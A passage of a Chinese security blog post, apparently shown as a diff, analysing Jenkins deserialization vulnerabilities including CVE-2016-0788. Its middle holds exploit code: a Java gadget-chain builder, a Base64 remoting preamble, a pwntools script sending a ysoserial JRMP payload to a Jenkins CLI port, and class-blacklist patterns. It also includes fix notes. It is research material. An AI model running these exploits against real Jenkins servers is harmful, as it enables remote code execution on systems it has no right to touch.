+<pre><code class="java">public boolean equals(Object o) {
+    // Override AbstractSet version to avoid calling size()
+    if (o == this)
+        return true;
+    if (!(o instanceof Set))
+        return false;
+    Collection&lt;?&gt; c = (Collection&lt;?&gt;) o;
+    try {
+        return containsAll(c) &amp;&amp; c.containsAll(this);
+    } catch (ClassCastException unused) {
+        return false;
+    } catch (NullPointerException unused) {
+        return false;
+    }
+}
+</code></pre>
+<p>这里调用了 c.containsAll，可以用来连接 containsAll，但是有个要求，c 必须是 Set 类型的对象，所以还需要找到一个 containsAll 函数返回值可控的 Set 类，这里找到 ListOrderedSet 类，其 containsAll 函数来自父类 AbstractCollectionDecorator：</p>
+<pre><code class="java">public boolean containsAll(Collection coll) {
+    return this.collection.containsAll(coll);
+}
+</code></pre>
+<p>至于怎么连接 equals，方法挺多的，最常见的办法就是利用 Map，不过一般情况下都需要一致的 hashCode 才能触发，而 ConcurrentSkipListSet 的 hashCode 计算起来比较复杂，所以再周转一下，找到 CopyOnWriteArraySet 类：</p>
+<pre><code class="java">public boolean equals(Object o) {
+    if (o == this)
+        return true;
+    if (!(o instanceof Set))
+        return false;
+    Set&lt;?&gt; set = (Set&lt;?&gt;)(o);
+    Iterator&lt;?&gt; it = set.iterator();
+
+    // Uses O(n^2) algorithm that is only appropriate
+    // for small sets, which CopyOnWriteArraySets should be.
+
+    //  Use a single snapshot of underlying array
+    Object[] elements = al.getArray();
+    int len = elements.length;
+    // Mark matched elements to avoid re-checking
+    boolean[] matched = new boolean[len];
+    int k = 0;
+    outer: while (it.hasNext()) {
+        if (++k &gt; len)
+            return false;
+        Object x = it.next();
+        for (int i = 0; i &lt; len; ++i) {
+            if (!matched[i] &amp;&amp; eq(x, elements[i])) {
+                matched[i] = true;
+                continue outer;
+            }
+        }
+        return false;
+    }
+    return k == len;
+}
+
+private static boolean eq(Object o1, Object o2) {
+    return (o1 == null) ? o2 == null : o1.equals(o2);
+}
+</code></pre>
+<p>遍历参数 o，然后依次跟自身属性 al 中的元素调用 eq 作比较。而其 hashCode 函数如下：</p>
+<pre><code class="java">public int hashCode() {
+    int h = 0;
+    Iterator&lt;E&gt; i = iterator();
+    while (i.hasNext()) {
+        E obj = i.next();
+        if (obj != null)
+            h += obj.hashCode();
+    }
+    return h;
+}
+
+public Iterator&lt;E&gt; iterator() {
+    return al.iterator();
+}
+</code></pre>
+<p>可以看到，其 hashCode 同样来自属性 al，所以我们可以使用两个元素相同顺序不同的 CopyOnWriteArraySet，里面存放 ConcurrentSkipListSet 和 ListOrderedSet 对象，这样就可以以 ListOrderedSet 为参数触发 ConcurrentSkipListSet 的 equals 函数了。</p>
+<p>能触发 equals 的 map，payload 中采用的是 ReferenceMap，其 readObject 如下：</p>
+<pre><code class="java">private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+    in.defaultReadObject();
+    this.doReadObject(in);
+}
+</code></pre>
+<p>doReadObject 来自父类 AbstractReferenceMap：</p>
+<pre><code class="java">protected void doReadObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+    this.keyType = in.readInt();
+    this.valueType = in.readInt();
+    this.purgeValues = in.readBoolean();
+    this.loadFactor = in.readFloat();
+    int capacity = in.readInt();
+    this.init();
+    this.data = new HashEntry[capacity];
+
+    while(true) {
+        Object key = in.readObject();
+        if (key == null) {
+            this.threshold = this.calculateThreshold(this.data.length, this.loadFactor);
+            return;
+        }
+
+        Object value = in.readObject();
+        this.put(key, value);
+    }
+}
+</code></pre>
+<p>然后是 put：</p>
+<pre><code class="java">public Object put(Object key, Object value) {
+    if (key == null) {
+        throw new NullPointerException(&quot;null keys not allowed&quot;);
+    } else if (value == null) {
+        throw new NullPointerException(&quot;null values not allowed&quot;);
+    } else {
+        this.purgeBeforeWrite();
+        return super.put(key, value);
+    }
+}
+
+public Object put(Object key, Object value) {
+    key = this.convertKey(key);
+    int hashCode = this.hash(key);
+    int index = this.hashIndex(hashCode, this.data.length);
+
+    for(AbstractHashedMap.HashEntry entry = this.data[index]; entry != null; entry = entry.next) {
+        if (entry.hashCode == hashCode &amp;&amp; this.isEqualKey(key, entry.key)) {
+            Object oldValue = entry.getValue();
+            this.updateEntry(entry, value);
+            return oldValue;
+        }
+    }
+
+    this.addMapping(index, hashCode, key, value);
+    return null;
+}
+
+protected boolean isEqualKey(Object key1, Object key2) {
+    key2 = this.keyType &gt; 0 ? ((Reference)key2).get() : key2;
+    return key1 == key2 || key1.equals(key2);
+}
+</code></pre>
+<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>观察参考文章的 payload，可以发现其是通过 HTTP 方式触发的，还用到了两个奇怪的类，通过 writeReplace 进行序列化，可能是为了避免生成对象的过程中触发某些奇特操作，还是用反射的方式写吧。</p>
+<p>首先生成序列化数据测试一下先：</p>
+<pre><code class="java">SignedObject signedObject = (SignedObject)createWithoutConstructor(&quot;java.security.SignedObject&quot;);
+setField(signedObject, &quot;content&quot;, getPOC());
+setField(signedObject, &quot;signature&quot;, &quot;Twings&quot;.getBytes());
+setField(signedObject, &quot;thealgorithm&quot;, null);
+
+JSONArray jsonArray = new JSONArray();
+ListOrderedSet listOrderedSet = new ListOrderedSet();
+setField(listOrderedSet, &quot;collection&quot;, jsonArray);
+
+ConcurrentSkipListSet concurrentSkipListSet = new ConcurrentSkipListSet();
+concurrentSkipListSet.add(&quot;1&quot;);
+Object m = getFieldValue(concurrentSkipListSet, &quot;m&quot;);
+Object head = getFieldValue(m, &quot;head&quot;);
+Object node = getFieldValue(head, &quot;node&quot;);
+Object next = getFieldValue(node, &quot;next&quot;);
+setField(next, &quot;key&quot;, signedObject);
+
+CopyOnWriteArrayList copyOnWriteArrayList1 = new CopyOnWriteArrayList();
+copyOnWriteArrayList1.add(&quot;1&quot;);
+copyOnWriteArrayList1.add(&quot;2&quot;);
+Object[] array1 = (Object[])getFieldValue(copyOnWriteArrayList1, &quot;array&quot;);
+array1[0] = listOrderedSet;
+array1[1] = concurrentSkipListSet;
+
+CopyOnWriteArrayList copyOnWriteArrayList2 = new CopyOnWriteArrayList();
+copyOnWriteArrayList2.add(&quot;1&quot;);
+copyOnWriteArrayList2.add(&quot;2&quot;);
+Object[] array2 = (Object[])getFieldValue(copyOnWriteArrayList2, &quot;array&quot;);
+array2[0] = concurrentSkipListSet;
+array2[1] = listOrderedSet;
+
+CopyOnWriteArraySet copyOnWriteArraySet1 = new CopyOnWriteArraySet();
+setField(copyOnWriteArraySet1, &quot;al&quot;, copyOnWriteArrayList1);
+
+CopyOnWriteArraySet copyOnWriteArraySet2 = new CopyOnWriteArraySet();
+setField(copyOnWriteArraySet2, &quot;al&quot;, copyOnWriteArrayList2);
+
+ReferenceMap referenceMap = new ReferenceMap();
+referenceMap.put(&quot;1&quot;, &quot;Twings&quot;);
+referenceMap.put(&quot;2&quot;, &quot;Aluvion&quot;);
+Object[] data = (Object[])getFieldValue(referenceMap, &quot;data&quot;);
+setField(data[1], &quot;key&quot;, copyOnWriteArraySet1);
+setField(data[7], &quot;key&quot;, copyOnWriteArraySet2);
+
+byte[] poc = serialize(referenceMap);
+System.out.println(new String(Base64.getEncoder().encode(poc)));
+unserialize(poc);
+</code></pre>
+<p>使用反射还是要麻烦一些的，不过也容易理解一些，然后再仿照 payload 整个 python 脚本就行了。顺带一提，给出的 payload 里面的序列化 Capability 对象好像有点问题，可以自己改一下它的 mask 属性，修改后的 Capability 对象如下：</p>
+<pre><code class="python">preamble = &quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot; \
+           &quot;rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=&quot;
+</code></pre>
+<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>将 SignedObject 加入黑名单。</p>
+<h4 id="CVE-2016-0788"><a href="#CVE-2016-0788" class="headerlink" title="CVE-2016-0788"></a>CVE-2016-0788</h4><pre><code class="bash">docker pull jenkins:1.642.1
+</code></pre>
+<h5 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>跟 CVE-2017-1000353 一样都是 CVE-2015-8103 的绕过，触发点也相同，不过这里走的不是 HTTP 途径，而且用的是 JRMP 方式，1.642.1 版本下的黑名单如下：</p>
+<pre><code class="java">return new ClassFilter.RegExpClassFilter(Arrays.asList(Pattern.compile(&quot;^org\\.codehaus\\.groovy\\.runtime\\..*&quot;), Pattern.compile(&quot;^org\\.apache\\.commons\\.collections\\.functors\\..*&quot;), Pattern.compile(&quot;.*org\\.apache\\.xalan.*&quot;)));
+</code></pre>
+<p>没有禁止 JRMP，所以可以通过反序列化创建一个 JRMP Client 连接我们的 Sever，返回 commons-collections 的序列化攻击链实现攻击。（当然反过来用 JRMP Listener 也是可以的）</p>
+<h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>ysoerial 中就有这个漏洞的利用代码，可以读一下。</p>
+<h6 id="JenkinsReverse"><a href="#JenkinsReverse" class="headerlink" title="JenkinsReverse"></a>JenkinsReverse</h6><pre><code class="python">from pwn import *
+import base64
+
+context.log_level = &quot;debug&quot;
+target = remote(&quot;172.17.0.2&quot;, 50000)
+
+protocol = &quot;Protocol:CLI-connect&quot;
+target.send(&quot;\x00&quot; + chr(len(protocol)) + protocol)
+target.recv()
+pause()
+capability = &quot;rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=&quot;
+target.send(&quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;)
+target.send(capability)
+pause()
+target.send(&quot;\x00\x00\x00\x00&quot;)
+JRMPClient = base64.b64decode(&quot;JRMPClient payload from ysoserial&quot;)
+target.send(JRMPClient)
+
+target.interactive()
+target.close()
+</code></pre>
+<p>然后在云主机之类的地方用 ysoserial 开个 JRMPListener 即可。</p>
+<h6 id="JenkinsListener"><a href="#JenkinsListener" class="headerlink" title="JenkinsListener"></a>JenkinsListener</h6><p>这种方式就比较复杂了，主要分为三步，每次传输的都是一段序列化数据，然后触发服务端相应的处理，第一步的代码如下：</p>
+<pre><code class="java">InetSocketAddress isa = JenkinsCLI.getCliPort(jenkinsUrl);
+c = JenkinsCLI.openChannel(isa);
+
+Object call = c.call( JenkinsCLI.getPropertyCallable(JarLoader.class.getName() + &quot;.ours&quot;));
+</code></pre>
+<p>getPropertyCallable 函数如下：</p>
+<pre><code class="java">public static Callable&lt;?, ?&gt; getPropertyCallable ( final Object prop )
+    throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
+    Class&lt;?&gt; reqClass = Class.forName(&quot;hudson.remoting.RemoteInvocationHandler$RPCRequest&quot;);
+    Constructor&lt;?&gt; reqCons = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);
+    Reflections.setAccessible(reqCons);
+    Object getJarLoader = reqCons
+        .newInstance(1, Class.forName(&quot;hudson.remoting.IChannel&quot;).getMethod(&quot;getProperty&quot;, Object.class), new Object[] {
+            prop
+        });
+    return (Callable&lt;?, ?&gt;) getJarLoader;
+}
+</code></pre>
+<p>简单来说就是一个 RPCRequest 类，它是 Command 类的子类，其构造函数如下：</p>
+<pre><code class="java">public RPCRequest(int oid, Method m, Object[] arguments, ClassLoader cl) {
+    this.oid = oid;
+    this.arguments = arguments;
+    this.methodName = m.getName();
+    this.classLoader = cl;
+    this.types = new String[arguments.length];
+    Class&lt;?&gt;[] params = m.getParameterTypes();
+
+    for(int i = 0; i &lt; arguments.length; ++i) {
+        this.types[i] = params[i].getName();
+    }
+
+    assert this.types.length == arguments.length;
+
+}
+</code></pre>
+<p>所以该对象中的 oid 属性为 1，methodName 属性为 getProperty，arguments 属性为 JarLoader.ours。然后到了服务端那边：</p>
+<pre><code class="java">try {
+    cmd = SynchronousCommandTransport.this.read();
+} catch (EOFException var23) {
+    IOException ioe = new IOException(&quot;Unexpected termination of the channel&quot;);
+    ioe.initCause(var23);
+    throw ioe;
+} catch (ClassNotFoundException var24) {
+    SynchronousCommandTransport.LOGGER.log(Level.SEVERE, &quot;Unable to read a command (channel &quot; + name + &quot;)&quot;, var24);
+    continue;
+} finally {
+    ++this.commandsReceived;
+}
+
+this.receiver.handle(cmd);
+</code></pre>
+<p>反序列化出 RPCRequest 对象后，会调用 handler：</p>
+<pre><code class="java">public void handle(Command cmd) {
+    Channel.this.updateLastHeard();
+    if (Channel.logger.isLoggable(Level.FINE)) {
+        Channel.logger.fine(&quot;Received &quot; + cmd);
+    }
+
+    try {
+        cmd.execute(Channel.this);
+    } 
+    ...
+
+}
+</code></pre>
+<p>然后调用 RPCRequest 的 execute，关键的三行代码如下：</p>
+<pre><code class="java">channel.pipeWriter.get(Request.this.lastIoId).get();
+RSP r = Request.this.perform(channel);
+rsp = new Response(Request.this.id, this.calcLastIoId(), r);
+</code></pre>
+<p>通过 perform 进行处理，然后将 Response 写入相应，perform 函数如下：</p>
+<pre><code class="java">protected Serializable perform(Channel channel) throws Throwable {
+    Object o = channel.getExportedObject(this.oid);
+    Class[] clazz = channel.getExportedTypes(this.oid);
+
+    try {
+        Method m = this.choose(clazz);
+        if (m == null) {
+            throw new IllegalStateException(&quot;Unable to call &quot; + this.methodName + &quot;. No matching method found in &quot; + Arrays.toString(clazz) + &quot; for &quot; + o);
+        } else {
+            m.setAccessible(true);
+
+            Object r;
+            try {
+                r = m.invoke(o, this.arguments);
+            } catch (IllegalArgumentException var7) {
+                throw new RemotingSystemException(&quot;failed to invoke &quot; + m + &quot; on &quot; + o + Arrays.toString(this.arguments), var7);
+            }
+
+            if (r != null &amp;&amp; !(r instanceof Serializable)) {
+                throw new RemotingSystemException(new ClassCastException(r.getClass() + &quot; is returned from &quot; + m + &quot; on &quot; + o.getClass() + &quot; but it&#39;s not serializable&quot;));
+            } else {
+                return (Serializable)r;
+            }
+        }
+    } catch (InvocationTargetException var8) {
+        throw var8.getTargetException();
+    }
+}
+</code></pre>
+<p>通过 choose 获取反射函数：</p>
+<pre><code class="java">private Method choose(Class[] interfaces) {
+    Class[] arr$ = interfaces;
+    int len$ = interfaces.length;
+
+    for(int i$ = 0; i$ &lt; len$; ++i$) {
+        Class clazz = arr$[i$];
+        Method[] arr$ = clazz.getMethods();
+        int len$ = arr$.length;
+
+        label38:
+        for(int i$ = 0; i$ &lt; len$; ++i$) {
+            Method m = arr$[i$];
+            if (m.getName().equals(this.methodName)) {
+                Class&lt;?&gt;[] paramTypes = m.getParameterTypes();
+                if (paramTypes.length == this.arguments.length) {
+                    for(int i = 0; i &lt; this.types.length; ++i) {
+                        if (!this.types[i].equals(paramTypes[i].getName())) {
+                            continue label38;
+                        }
+                    }
+
+                    return m;
+                }
+            }
+        }
+    }
+
+    return null;
+}
+</code></pre>
+<p>可以看出反射函数来自反射主体所继承的接口，并且要与函数名、参数等数据吻合。</p>
+<p>然后就是一个显眼的反射操作，oid、method 都是可以可控制的，需要看一下的就是 channel.getExportedObject（作为反射的主体）和 channel.getExportedTypes（用于获取执行反射操作的函数）获取到的结果，经过调试可以发现，exportedObjects 表中只有一个成员，channel 自身。然后则会调用该 channel 的 getProperty 函数，参数为 JarLoader.ours，同样通过调试可以看到 properties 属性的值：</p>
+<pre><code class="java">{hudson.cli.CliEntryPoint=hudson.cli.CliManagerImpl@405894b7, hudson.remoting.JarLoader.ours=hudson.remoting.JarLoaderImpl@44671864}
+</code></pre>
+<p>所以这一步获取到的实际上是一个 JarLoaderImpl 对象，然后生成 Response：</p>
+<pre><code class="java">return new UserResponse(this.serialize(r, channel), false);
+</code></pre>
+<p>并写入响应：</p>
+<pre><code class="java">channel.send(rsp);
+</code></pre>
+<p>在序列化 JarLoaderImpl 对象的时候，会触发其 writeReplace 函数：</p>
+<pre><code class="java">private Object writeReplace() {
+    return Channel.current().export(JarLoader.class, this);
+}
+</code></pre>
+<p>调用 channel 的 export 函数将自身放入其 exportedObjects 表中，所以下次交互进行到 perform 函数中的反射时，可以使用 JarLoaderImpl 作为反射主体。</p>
+<p>经过处理后，最终返回的是一个 Proxy 对象，其 invocationhandler 中存放着 JarLoaderImpl 对象的 oid（用于表示远程对象的一个数字），调试可得其为 2。</p>
+<p>然后进入第二步：</p>
+<pre><code class="java">Object uro = new JRMPListener().getObject(String.valueOf(jrmpPort));
+
+Class&lt;?&gt; reqClass = Class.forName(&quot;hudson.remoting.RemoteInvocationHandler$RPCRequest&quot;);
+
+Object o = makeIsPresentOnRemoteCallable(oid, uro, reqClass);
+
+try {
+    c.call((Callable&lt;?, ?&gt;) o);
+}
+</code></pre>
+<p>生成一段 JRMPListener payload，然后调用 makeIsPresentOnRemoteCallable：</p>
+<pre><code class="java">private static Object makeIsPresentOnRemoteCallable ( int oid, Object uro, Class&lt;?&gt; reqClass )
+    throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException {
+    Constructor&lt;?&gt; reqCons = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);
+    Reflections.setAccessible(reqCons);
+    return reqCons
+        .newInstance(oid, JarLoader.class.getMethod(&quot;isPresentOnRemote&quot;, Class.forName(&quot;hudson.remoting.Checksum&quot;)), new Object[] {
+            uro,
+        });
+}
+</code></pre>
+<p>可以看到生成的同样是一个 RPCRequest 类，这次其 oid 为 2，methodName 为 isPresentOnRemote，arguments 为 JRMPListener payload。这样来到 perform 函数时，就是在 JarLoaderImpl 对象上调用其接口 JarLoader 的 isPresentOnRemote 函数，但是这里有个问题，JarLoader 接口的 isPresentOnRemote 函数是一个抽象函数：</p>
+<pre><code class="java">boolean isPresentOnRemote(Checksum var1);
+</code></pre>
+<p>于是就会报错并抛出异常：</p>
+<pre><code class="java">throw new RemotingSystemException(&quot;failed to invoke &quot; + m + &quot; on &quot; + o + Arrays.toString(this.arguments), var7);
+</code></pre>
+<p>而上一层则会捕捉异常并将其作为响应：</p>
+<pre><code class="java">catch (Throwable var18) {
+    rsp = new Response(Request.this.id, this.calcLastIoId(), var18);
+} 
+</code></pre>
+<p>观察报错信息：</p>
+<pre><code>failed to invoke public abstract boolean hudson.remoting.JarLoader.isPresentOnRemote(hudson.remoting.Checksum) on hudson.remoting.JarLoaderImpl@2cae1e9d[ActivationGroupImpl[UnicastServerRef [liveRef: [endpoint:[172.17.0.2:12345](local),objID:[6c817df0:175f8bef343:-7ffd, 937379779203472170]]]]]
+</code></pre><p>报错会打印出 arguments，也就是 JRMPListener payload，这是一个 ActivationGroupImpl -&gt; UnicastServerRef -&gt; LiveRef 的对象，而在报错打印数据时调用的 LiveRef 的 toString 函数中：</p>
+<pre><code class="java">public String toString() {
+    String var1;
+    if (this.isLocal) {
+        var1 = &quot;local&quot;;
+    } else {
+        var1 = &quot;remote&quot;;
+    }
+
+    return &quot;[endpoint:&quot; + this.ep + &quot;(&quot; + var1 + &quot;),&quot; + &quot;objID:&quot; + this.id + &quot;]&quot;;
+}
+</code></pre>
+<p>会将其中的 objID 打印出来。</p>
+<p>接下来就是最后一步了：</p>
+<pre><code class="java">try {
+    c.call((Callable&lt;?, ?&gt;) o);
+}
+catch ( Exception e ) {
+    // [ActivationGroupImpl[UnicastServerRef [liveRef:
+    // [endpoint:[172.16.20.11:12345](local),objID:[de39d9c:15269e6d8bf:-7fc1,
+    // -9046794842107247609]]
+
+    System.err.println(e.getMessage());
+
+    parseObjIdAndExploit(args, payloadClass, jrmpPort, isa, e);
+}
+</code></pre>
+<p>执行第二步操作并捕捉前面提到的因为调用了抽象函数抛出的异常，然后调用 parseObjIdAndExploit，解析报错信息中的 objID，然后调用 exploit，可以看到 exploit 部分其实跟 JRMPClient 差别不大，不同的地方就在于写入了前面解析出来的 objID，而不是默认的 2。</p>
+<p>跟踪一下 JRMPListener 的反序列化过程，看到 Transport 类的 serviceCall 函数：</p>
+<pre><code class="java">public boolean serviceCall(final RemoteCall var1) {
+    try {
+        ObjID var39;
+        try {
+            var39 = ObjID.read(var1.getInputStream());
+        } catch (IOException var33) {
+            throw new MarshalException(&quot;unable to read objID&quot;, var33);
+        }
+
+        Transport var40 = var39.equals(dgcID) ? null : this;
+        Target var5 = ObjectTable.getTarget(new ObjectEndpoint(var39, var40));
+        final Remote var37;
+        if (var5 != null &amp;&amp; (var37 = var5.getImpl()) != null) {
+            final Dispatcher var6 = var5.getDispatcher();
+            var5.incrementCallCount();
+
+            boolean var8;
+            try {
+                transportLog.log(Log.VERBOSE, &quot;call dispatcher&quot;);
+                final AccessControlContext var7 = var5.getAccessControlContext();
+                ClassLoader var41 = var5.getContextClassLoader();
+                ClassLoader var9 = Thread.currentThread().getContextClassLoader();
+
+                try {
+                    setContextClassLoader(var41);
+                    currentTransport.set(this);
+
+                    try {
+                        AccessController.doPrivileged(new PrivilegedExceptionAction&lt;Void&gt;() {
+                            public Void run() throws IOException {
+                                Transport.this.checkAcceptPermission(var7);
+                                var6.dispatch(var37, var1);
+                                return null;
+                            }
+                        }, var7);
+                        return true;
+                    } 
+                    ...
+                } 
+                ...
+            } 
+            ...
+        }
+
+        ...
+    } 
+    ...
+}
+</code></pre>
+<p>可以看到，这里反序列化出 ObjID 后，会根据 ObjID 从 ObjectTable 取出 Target 对象，然后再从 Target 对象中取出 ClassLoader 并设置为当前环境下的 classLoader。</p>
+<p>而调试可以得知，当使用默认的 objID 时，其 classLoader 为 AppClassLoader，其加载路径为启动命令、系统属性等 classpath，而 Jenkins 的 commons-collections 包是放在 lib 目录下的，也就是说要用 WebAppClassLoader 才能加载到，所以就会因为无法加载类而导致利用失败。</p>
+<p>而在 JRMPListener payload 反序列化过程中，会调用 UnicastServerRef 类的 exportObject 函数：</p>
+<pre><code class="java">public Remote exportObject(Remote var1, Object var2, boolean var3) throws RemoteException {
+    Class var4 = var1.getClass();
+
+    Remote var5;
+    try {
+        var5 = Util.createProxy(var4, this.getClientRef(), this.forceStubUse);
+    } catch (IllegalArgumentException var7) {
+        throw new ExportException(&quot;remote object implements illegal remote interface&quot;, var7);
+    }
+
+    if (var5 instanceof RemoteStub) {
+        this.setSkeleton(var1);
+    }
+
+    Target var6 = new Target(var1, this, var5, this.ref.getObjID(), var3);
+    this.ref.exportObject(var6);
+    this.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);
+    return var5;
+}
+</code></pre>
+<p>他会生成一个新的 Target，用自身 ref 属性（即 LiveRef）中的 objID 进行标识，并通过 putTarget 将其放入 ObjectTable 中。所以我们通过报错获取 LiveRef 中的 objID 后，就可以通过该 objID 在反序列化时获取相应 Target 中的 WebAppClassLoader。</p>
+<h5 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>将 rmi 相关的包放入黑名单。</p>
+<hr>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/articles/web/242764.html" target="_blank" rel="noopener">安全研究 | Jenkins漏洞分析</a></p>
+<p><a href="https://xz.aliyun.com/t/6361" target="_blank" rel="noopener">Jenkins RCE漏洞分析汇总</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/11/10/Tomcat源码观测/">
+                        <span>Tomcat源码观测</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Jenkins相关漏洞学习（一）&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
